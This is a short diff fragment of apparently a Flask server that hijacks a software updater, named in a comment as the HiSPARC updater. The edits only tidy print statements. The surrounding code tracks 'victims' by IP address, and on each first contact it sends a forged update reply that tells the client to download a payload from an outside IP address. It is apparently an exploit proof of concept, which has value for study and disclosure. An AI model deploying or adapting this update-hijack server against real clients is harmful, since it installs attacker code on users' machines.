@@ -20,16 +20,16 @@ def hello_world():
 def show_update(subpath):
     try:
         remote_ip = request.remote_addr
-        print('Victim in trap: %s' % str(remote_ip))
+        print('Victim in trap: %s' % remote_ip)
         flag_fn = 'victim_%s' % remote_ip
         if not os.path.exists(flag_fn):
             # flag does not exist: New victim!
-            print('*********** New victim! %s' % str(remote_ip))
+            print('*********** New victim! %s' % remote_ip)
             with open(flag_fn, 'w') as f:
                 f.write('foobar!')
             return 'newVersionUser=14&mustUpdate=1&urlUser=http://77.175.129.123/static/%s' % PAYLOAD
         else:
-            print('Not messing with old victim! %s' % str(remote_ip))
+            print('Not messing with old victim! %s' % remote_ip)
             return 'mustUpdate=0'
     except Exception as e:
         # HiSPARC updater will crash (halt) on broken HTTP reply,
